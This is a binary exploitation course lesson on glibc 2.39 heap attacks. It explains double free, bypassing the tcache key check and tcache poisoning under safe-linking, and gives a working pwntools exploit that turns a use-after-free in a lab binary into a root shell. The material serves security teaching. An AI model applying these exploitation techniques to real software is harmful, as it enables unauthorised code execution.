---
title: "Lesson 9.3: Double Free and Tcache Poisoning"
image:
  path: /assets/img/covers/pwn-9-3-double-free-tcache-poisoning.webp
  alt: "Double Free and Tcache Poisoning"
date: 2026-10-10 17:15:00 +0700
categories: ["Binary Exploitation", "Pwn · Heap Basics"]
tags: [pwn, heap, tcache-poisoning, double-free]
render_with_liquid: false
---

This is the core lesson of the heap part. We break tcache's own metadata: understand double free and how glibc 2.39 defends against it, then do tcache poisoning to force malloc into returning a chunk at an address of our choosing, overwrite a variable, and hijack control flow. Everything runs live on glibc 2.39, with safe-linking handled using real numbers.

![Poisoning a chunk's next pointer to point malloc at a chosen target](/assets/img/pwn/pwn-9-3-double-free-tcache-poisoning.svg)
_Two chunks are freed for a count of 2. The head chunk's next is overwritten with PROTECT(pos, target), so the second malloc returns target instead of heap memory._

**Prerequisites:** Lesson 9.1 (safe-linking, key, count), Lesson 9.2 (UAF, reclaim). A solid grasp of XOR and hex numbers.

**Tools:** pwntools, gdb, gcc. Binary provided in the Lab section below.

## Goals

By the end you can explain double free on tcache and why glibc 2.39 blocks it (the key field), know how to deal with key to free into the same tcache again, or use the safer alternative, perform tcache poisoning WITH safe-linking, computing `PROTECT` yourself to forge `next`, understand the "count gate" that forces freeing two chunks instead of one, and force malloc to return an address of your choosing (aligned to 16) and overwrite it to get a shell.

## Theory

### Double free and the key field

Double free is freeing the same chunk twice. On tcache, without any protection, the second free pushes the same chunk back into the bin, so the bin holds the same chunk twice. The next two mallocs then return the same address: you have two "live" pointers pointing at one region, a very strong primitive.

Since glibc 2.29, every chunk entering tcache gets a `key` at `mem + 0x08`, set to `tcache_key`. On free, glibc checks whether the chunk's `key` matches `tcache_key`; if so, it scans the bin, and if the chunk is already there, it aborts with this message.

```
free(): double free detected in tcache 2
```

On glibc 2.34 and later, `tcache_key` is a random 64-bit value generated once per process, unguessable. So how do you double free at all? Two routes:

- Overwrite `key` to a value different from `tcache_key` (through a UAF edit). The "key matches" check then misses, glibc skips the scan, and the second free succeeds. This is the route used in the double-free demo.
- Or avoid double free entirely: for poisoning (below) all you need is two already-freed chunks, not necessarily the same chunk twice. This route is cleaner and more stable on modern glibc, so the main exploit uses it.

### tcache poisoning

The idea: a chunk's `next` pointer in tcache decides what the following malloc hands out after the first chunk is taken. If we overwrite `next` to be an arbitrary address (call it TARGET), then after malloc drains the real chunks, the next malloc returns TARGET as if it were a chunk. We now have a pointer straight into TARGET to read and write. TARGET can be a global variable, a function pointer, or a GOT entry.

On glibc 2.39 there are three conditions that must be handled correctly, or it breaks.

#### 1) Safe-linking: you must compute PROTECT yourself

Do not write a raw address into `next`. You must write the obfuscated value shown here.

```
stored_next = PROTECT(pos, TARGET) = (pos >> 12) XOR TARGET
```

where `pos` is the `mem` address of the chunk being poisoned (where `next` lives). You need to know `pos >> 12`, the heap's page. We leak it from Lesson 9.1: free a chunk into an empty bin, and reading `fd` gives `mem >> 12`.

#### 2) Alignment: TARGET must be 16-byte aligned

When malloc pulls a chunk from tcache, glibc 2.32+ checks `aligned_OK`: the returned `mem` address must be divisible by 16. If TARGET is not aligned, malloc aborts with this message.

```
malloc(): unaligned tcache chunk detected
```

So TARGET must be a 16-byte aligned address. If the entry you want to write is not aligned (for example a GOT entry ending in 0x8), the trick is to aim TARGET at `that_entry - 8` (which is aligned) and pad 8 bytes before the value when writing. Lesson 9.4 covers this in detail; here we pick a variable that is already aligned.

#### 3) Count gate: you must free two chunks

This is where many people trip up on modern glibc. malloc only pulls from tcache when `counts[idx] > 0`, so if you free only one chunk (count = 1) and then poison `next`, this is what happens.

- 1st malloc: count goes 1 to 0, returns the real chunk, bin head becomes TARGET.
- 2nd malloc: count is already 0, so malloc SKIPS tcache entirely and never returns TARGET.

We confirmed this experimentally (see the pitfalls section). The reliable fix is to free two different chunks so count = 2, after which this happens.

- 1st malloc: count goes 2 to 1, returns the head chunk, bin head becomes TARGET (thanks to the poison).
- 2nd malloc: count goes 1 to 0, returns TARGET.

So the exploit frees two chunks, poisons the `next` of the chunk at the head of the bin, then mallocs twice.

## Demo

Environment: Ubuntu 24.04.4 LTS, glibc 2.39, gcc 13.3.0. ASLR enabled. The exploit runs reliably.

The binary (source in the Lab section below) is a heap note with menu `alloc/free/edit/show/run-hook` and fixed chunk size 0x30. The UAF bug is that `free` does not clear the pointer, so `edit` and `show` still work on a freed chunk. There is a global, shown here.

```c
void (*hook)(void) __attribute__((aligned(16))) = safe_hook;  // TARGET, already aligned to 16
void win(void){ system("/bin/sh"); }                           // the destination we want
```

`run-hook` calls `hook()`. Goal: use poisoning to make `alloc` return `&hook`, write `&win` into it, then call `run-hook` to run `win`.

Build (no-PIE so `&hook` and `&win` stay fixed):

```bash
cd labs/9.3 && ./build.sh
```

Here is the core exploit, explained step by step.

```python
PROTECT = lambda pos, ptr: (pos >> 12) ^ ptr

alloc(0); alloc(1)              # chunk0 @ heap+0x2a0, chunk1 @ heap+0x2e0
free(0); free(1)               # tcache[0x40]: count=2, head=chunk1, chunk1.fd=PROTECT(chunk1,chunk0)

leak = u64(show(0))            # chunk0 is the SECOND entry in the bin, fd = PROTECT(chunk0,NULL) = chunk0>>12
heap_base = leak << 12         # because chunk0 & 0xfff = 0x2a0 < 0x1000
chunk1 = heap_base + 0x2e0

hook = elf.sym['hook']
edit(1, p64(PROTECT(chunk1, hook)))   # poison chunk1's next (currently at bin head)

alloc(2)                        # returns chunk1; bin head = REVEAL(chunk1.fd) = &hook
alloc(3)                        # returns &hook  (slots[3] = &hook)
edit(3, p64(elf.sym['win']))    # *hook = win
runhook()                       # hook() -> win() -> /bin/sh
```

Here are the easy-to-get-wrong parts, explained.

- Leaking heap: after `free(0); free(1)`, chunk0 is the second entry in the bin, so its `fd` is still `PROTECT(chunk0, NULL) = chunk0 >> 12`. Because chunk0 sits at `heap_base + 0x2a0` (within the first page), `chunk0 >> 12 = heap_base >> 12`. Shift left 12 bits and you have `heap_base` back.
- Computing PROTECT: chunk1 is at the head of the bin, on the same page as chunk0, so `chunk1 >> 12 = heap_base >> 12` too. Poison `chunk1.fd = (chunk1 >> 12) XOR &hook`.
- Two mallocs: the first pulls chunk1 and sets the bin head to `&hook` (via REVEAL on the value we just wrote); the second one still has count > 0, so it returns `&hook`.

This is the real output (ASLR on, heap_base random each run).

```
[*] leak(chunk0>>12) = 0x37849
[*] heap_base        = 0x37849000
[*] chunk1 (head)    = 0x378492e0
[*] wrote win=0x401276 into hook=0x404070
[win] hook hijacked -> /bin/sh
===PWNED_9_3===
uid=0(root) gid=0(root) groups=0(root)
===END===
[+] tcache poisoning OK: hook->win, got shell
```

Because heap_base comes from a leak rather than a hardcoded value, the exploit still works with ASLR on.

### Double free and key demo

The double-free script in the Lab section below shows two things, in this real output.

```
[A] free(0) twice in a row:
    free(): double free detected in tcache 2
[B] after clearing key, free(0) a second time: freed
[B] show(slot2) first 8 bytes = b'MARK_FRO'
```

- (A): freeing the same chunk twice in a row is caught by glibc right away.
- (B): using `edit` to overwrite `key` (offset 0x08) with 0 and then freeing again gets past the check. The bin now holds the chunk twice (a duplicate). Proof: allocating twice gives two slots backed by the same chunk, writing `MARK_FROM_SLOT1` through slot1 also shows up when you `show` slot2.

Why the main exploit avoids double free: the count gate (section 1 above) means a duplicated single chunk still only allows two allocations before count hits zero, not enough to surface TARGET. Using two distinct chunks for poisoning is cleaner and more reliable. Double free is still an important primitive (two pointers into one region), it just is not the shortest route to an arbitrary address on glibc 2.39.

### Checking with gdb

Set a breakpoint right after `edit(1, ...)` and `x/2gx chunk1` to see that `fd` has become `PROTECT(chunk1, &hook)`. With pwndbg, `tcache` prints the chain already REVEALed, showing the bin head pointing at `&hook`.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 9.3</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-pwn/9.3.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-pwn/9.3/build.sh" download><i class="fa-solid fa-file-code"></i>build.sh</a>
<a class="lab-file" href="/assets/labs-pwn/9.3/dfree.py" download><i class="fa-solid fa-file-code"></i>dfree.py</a>
<a class="lab-file" href="/assets/labs-pwn/9.3/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
<a class="lab-file" href="/assets/labs-pwn/9.3/src.c" download><i class="fa-solid fa-file-code"></i>src.c</a>
</div>
</div>

- Challenge: exploit the binary provided in the Lab section below.
- Goal: run `win` (get a shell) via tcache poisoning, overwriting `hook`.
- Hints, in order:
  - Hint 1: what does `show` on a freed chunk print? How do you use it to leak the heap?
  - Hint 2: to make malloc return `&hook`, what do you need to write into the bin head's `next`? Remember safe-linking.
  - Hint 3: try freeing one chunk, then poisoning, and see if the second malloc returns the target. If not, free one more chunk (count gate).
  - Hint 4: is `&hook` 16-byte aligned? Check before you get stuck wondering why it aborts.
  - Self-check: can you write the `PROTECT` formula and explain exactly what `pos` is?

## Key takeaways

- glibc 2.29+ has a key to defend against double free; 2.34+ makes the key random, so you must overwrite it to bypass the check.
- Poisoning: write `next = PROTECT(pos, TARGET) = (pos >> 12) XOR TARGET`.
- Leak the heap from the `fd` of the first chunk freed into an empty bin: `fd = mem >> 12`.
- TARGET must be 16-byte aligned, or `aligned_OK` aborts.
- Count gate: you must free two chunks (count=2) so the second malloc returns TARGET.
- Make sure `pos` is the `mem` address of the chunk you are poisoning.

## Common pitfalls

- Writing a raw address into `next`. On glibc 2.32+ you must PROTECT it first, or malloc returns garbage and crashes. This is the number one issue when porting an old exploit to Ubuntu 24.04.
- Single-free poisoning. Confirmed by testing: freeing one chunk and then poisoning means the second malloc does NOT return TARGET, because count already hit zero. You must free two chunks.
- TARGET not aligned. Picking an entry that is not 16-byte aligned gets you `malloc(): unaligned tcache chunk detected`. Realign, or aim at TARGET - 8 and pad (see 9.4).
- Double free aborting. Forgetting to deal with key gives `free(): double free detected in tcache 2`. Overwrite key first, or use two chunks instead.
- Miscalculating `pos >> 12` when the chunk is near a page boundary. If the chunk and the leak target are not on the same page, `pos >> 12` differs from what you assumed. With the first chunk at offset 0x2a0 into the heap, this is safe.
- Hardcoding libc/heap offsets from a different build. The numbers 0x2a0, 0x40, and the count behavior are all for glibc 2.39; a different version needs to be re-measured.

## Further reading

- how2heap: `tcache_poisoning.c` (updated for safe-linking) and `tcache_dup.c`.
- Checkpoint's write-up on safe-linking (where the mechanism originated, glibc 2.32).
- glibc source `malloc/malloc.c`: `tcache_get`, `tcache_put`, `PROTECT_PTR`, the various `malloc_printerr` calls.
- Lesson 9.4: uses this exact poisoning technique to overwrite the GOT inside a CTF-style note program.
